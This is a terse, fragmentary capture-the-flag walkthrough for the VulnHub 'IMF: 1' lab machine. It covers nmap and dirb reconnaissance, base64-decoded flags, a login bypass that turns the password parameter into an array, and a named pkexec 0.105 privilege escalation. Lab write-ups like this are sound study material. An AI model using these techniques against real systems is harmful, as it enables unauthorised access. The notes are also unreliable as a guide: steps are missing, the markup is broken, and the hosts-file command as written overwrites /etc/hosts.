
 IMF: 1 Walkthrough

**VulnHub Link:** [IMF: 1](https://www.vulnhub.com/entry/imf-1,162/)
**Difficulty:** Medium
**Release Date:** 30 Oct 2016

## 1.Reconnaissance
```bash
nmap -A -O -T4 -P -sV 192.168.100.171

sudo echo "192.168.100.171    imf.local" > /etc/hosts
```

## 2. Enumaration 
```bash
dirb http://imf.local
```

from contact us page , view page source and observe flag1
flag1{YWxsdGhlZmlsZXM=

from the same page source observe js sections and combine them 
<script src="ZmxhZzJ7YVcxbVlXUnRhVzVwYzNSeVlYUnZjZz09fQ=="</script>

```bash
echo "ZmxhZzJ7YVcxbVlXUnRhVzVwYzNSeVlYUnZjZz09fQ" | base64 -d
```
flag2{aW1mYWRtaW5pc3RyYXRvcg==} found

```bash
echo "aW1mYWRtaW5pc3RyYXRvcg==" | base64 -d                  
imfadministrator
```

imf.local/imfadministrator found

opening burp suite and changing pass to pass[] and flag3 captured

flag3{Y29udGludWVUT2Ntcw==}

```bash
echo "Y29udGludWVUT2Ntcw==" | base64 -d
```
upload

flag4{dXBsb2Fkcjk0Mi5waHA=}

flag5{YWdlbnRzZXJ2aWNlcw==}

pkexec vulnerability found ---> pkexec version 0.105

wget http://

flag6{R2gwc3RQcm90MGMwbHM=}
